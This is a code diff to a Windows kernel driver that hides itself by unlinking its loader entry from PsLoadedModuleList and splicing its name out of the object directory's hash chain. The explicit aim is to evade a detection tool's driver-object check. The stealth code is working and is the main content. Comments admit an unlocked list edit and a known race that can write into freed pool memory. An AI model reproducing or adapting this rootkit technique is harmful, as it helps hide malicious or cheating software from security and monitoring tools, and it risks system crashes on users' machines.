@@ -1,5 +1,5 @@
-// Driver hiding: unlink the image from PsLoadedModuleList and remove the driver object's name from the
-// object directory. Everything here works on raw kernel structures, no mapping layer in between
+// Driver hiding: unlink the image from PsLoadedModuleList and remove the driver object's name from
+// the object directory. Raw kernel structures throughout, no mapping layer in between
 
 // Driver-object hiding is done on raw object-manager structures only: no kernel routine is called anywhere
 // here, just reads/writes on the _OBJECT_* layouts in Lib/structs.h. On Win10 19041 x64 the object manager
@@ -24,10 +24,9 @@ struct HiddenObjectState
 
 HiddenObjectState HiddenObject;
 
-// Removes the driver object's name from the object directory, so walks of \Driver (the reference tool's
-// "validate driver objects" check) no longer see the driver at all. The image was already unlinked from the
-// module list; this unlink from the directory's hash chain hides the object itself. Everything is manual:
-// pin the object, pin its name info, splice the name's chain node out of the bucket it lives in
+// Removes the driver object's name from the object directory, so \Driver walks (the reference tool's
+// "validate driver objects" check) no longer see it. All manual: pin object + name info, splice the
+// name's chain node out of the hash bucket
 bool HideDriverObject(win::DRIVER_OBJECT *DriverObject)
 {
     if (!DriverObject) return false;
@@ -68,20 +67,16 @@ bool HideDriverObject(win::DRIVER_OBJECT *DriverObject)
         return true;
     }
 
-    // Pin the object: one extra reference of our own, the same effect ObReferenceObjectByPointer had. An
-    // object whose last reference drops is torn down, and the teardown path would free the very chain node
-    // we removed; the pin keeps the object and its name info alive until we relink ourselves
+    // Pin the object: one extra reference, so teardown cannot free the chain node we are about to unlink
     __atomic_fetch_add(&Header->PointerCount, 1, __ATOMIC_SEQ_CST);
     print(INFO("HideDriver: object pinned, PointerCount incremented atomically"));
 
-    // Pin the name info: QueryReferences is what a name query bumps; while it is pinned the name info is
-    // never freed, correctly mirroring what keeps the name alive while unlinked
+    // Pin the name info, mirroring what keeps a name alive normally
     __atomic_fetch_add(&NameInfo->QueryReferences, 1, __ATOMIC_SEQ_CST);
     print(INFO("HideDriver: name info pinned, QueryReferences incremented atomically"));
 
-    // Walk all 37 buckets and their chains, looking for the node whose Object is the driver object. Every
-    // node carries a naked next pointer, so the walk needs the previous node to know which slot points at
-    // the one we found: for a bucket head that is the bucket itself, otherwise the previous node's ChainLink
+    // Walk the 37 buckets for the node whose Object is the driver object; the previous node (or the
+    // bucket itself for a head) is the slot that points at it
     _OBJECT_DIRECTORY_ENTRY** Slot = nullptr;
     _OBJECT_DIRECTORY_ENTRY* Entry = nullptr;
     uint32_t FoundBucket = 0;
@@ -121,15 +116,9 @@ bool HideDriverObject(win::DRIVER_OBJECT *DriverObject)
     HiddenObject.BucketIndex = FoundBucket;
     HiddenObject.Saved = true;
 
-    // Manual unlink: make the slot that pointed at the entry point at its successor instead. The entry node
-    // itself is left untouched, its ChainLink keeps describing where it sat, which makes relinking trivial.
-    // While unlinked the node stays alive, because (a) PointerCount is pinned so no reference transition
-    // triggers ObpDeleteNameCheck (the only thing that would free the name behind our back) and (b)
-    // QueryReferences is pinned so the name info is not freed even though nothing else names it. The object
-    // also stays PERMANENT; hiding no longer flips that flag, which was ObMakeTemporaryObject's doing.
-    // Staying permanent is safer: a permanent object can never be freed while the driver runs, and the
-    // kernel's own unload path (IopDeleteDriver) makes the object temporary itself before its final
-    // dereference, so there is no leak on unload either
+    // Unlink: the slot now points at the entry's successor. Both pins keep the node and name info alive
+    // while unlinked (no reference transition can free them). The object stays PERMANENT — IopDeleteDriver
+    // makes it temporary itself before the final dereference, so no leak on unload either
     *Slot = Entry->ChainLink;
     print(OK("HideDriver: entry %p unlinked from bucket %u, object invisible to directory walks"),
           Entry, FoundBucket);
@@ -142,8 +131,10 @@ void UnhideDriverObject()
 {
     if (!HiddenObject.Saved) return;
 
-    // Relink exactly: the slot that pointed at the entry (bucket head or previous node) is pointed at the
-    // entry again, restoring the chain byte for byte, whatever the buckets looked like in between
+    // Splice into the CURRENT chain: overwriting the slot instead orphaned objects inserted during the
+    // hide window. Byte-identical to the old relink when nothing changed. Known narrow race: if the
+    // node whose ChainLink IS the saved slot was removed during the window, this write lands in freed pool
+    HiddenObject.Entry->ChainLink = *HiddenObject.Slot;
     *HiddenObject.Slot = HiddenObject.Entry;
 
     // Release the pins in reverse order of taking them: name info first, then the object. Both decrements
@@ -157,8 +148,8 @@ void UnhideDriverObject()
     HiddenObject = {};
 }
 
-// Removes the driver itself from the kernel's loaded module list, so module walks (PsLoadedModuleList) no longer
-// report it. DriverSection is the loader entry (_KLDR_DATA_TABLE_ENTRY) the kernel created at load time. A manually
+// Unlinks the driver from PsLoadedModuleList, so module walks no longer report it. DriverSection is the
+// loader entry the kernel created at load time; a manually mapped driver has none and is skipped
 bool UnlinkDriverFromModuleList(win::DRIVER_OBJECT *DriverObject)
 {
     if (!DriverObject || !DriverObject->DriverSection)
@@ -179,8 +170,9 @@ bool UnlinkDriverFromModuleList(win::DRIVER_OBJECT *DriverObject)
         return false;
     }
 
-    // Bypass the entry in the doubly linked list, then make its own pointers point at itself, so a later walk that
-    // starts inside this entry does not go anywhere
+    // Bypass the entry, then self-link its own pointers so a walk starting inside it goes nowhere.
+    // Unlocked on purpose (PsLoadedModuleResource is not held): races a concurrent load/unload only on
+    // a busy thread — tolerated at DriverEntry on a quiet system, and verified below
     _LIST_ENTRY *Links = &Entry->InLoadOrderLinks;
     _LIST_ENTRY *Flink = Links->Flink;
     _LIST_ENTRY *Blink = Links->Blink;
@@ -217,10 +209,9 @@ bool UnlinkDriverFromModuleList(win::DRIVER_OBJECT *DriverObject)
     return true;
 }
 
-// Reverse of UnlinkDriverFromModuleList: re-attaches the driver's loader entry at the PsLoadedModuleList head.
-// Must run in Unload BEFORE returning to Mm. Mm's unload path removes the entry it created at load time; an entry
-// that stays detached leaves the loader-list bookkeeping inconsistent and the NEXT load of this driver bugchecks
-// 0x1A (0x2101) inside MiProcessLoaderEntry before DriverEntry ever runs
+// Re-attaches the loader entry at the PsLoadedModuleList head. MUST run at unload into Mm: a detached
+// entry leaves the loader-list bookkeeping inconsistent and the NEXT load bugchecks 0x1A (0x2101)
+// inside MiProcessLoaderEntry, before DriverEntry even runs
 bool RelinkDriverIntoModuleList(win::DRIVER_OBJECT *DriverObject)
 {
     if (!DriverObject || !DriverObject->DriverSection)
@@ -233,17 +224,12 @@ bool RelinkDriverIntoModuleList(win::DRIVER_OBJECT *DriverObject)
     _LIST_ENTRY *Links = &Entry->InLoadOrderLinks;
     _LIST_ENTRY *Head = (_LIST_ENTRY *) __imp_PsLoadedModuleList;
 
-    // Already attached? A guard walk from the head keeps a double relink from turning the list into a loop
-    constexpr uint32_t MaxWalk = 4096;
-    uint32_t Count = 0;
-    for (_LIST_ENTRY *Current = Head->Flink; Current && Current != Head && Count < MaxWalk; Current = Current->Flink)
+    // Attached entries are never self-linked (even a one-module list wraps through the head), so one
+    // compare replaces the old head walk
+    if (Links->Flink != Links)
     {
-        Count++;
-        if (Current == Links)
-        {
-            print(INFO("RelinkDriver: entry %p already attached, skipping"), (void *) Entry);
-            return true;
-        }
+        print(INFO("RelinkDriver: entry %p already attached, skipping"), (void *) Entry);
+        return true;
     }
 
     if (!Head->Flink)
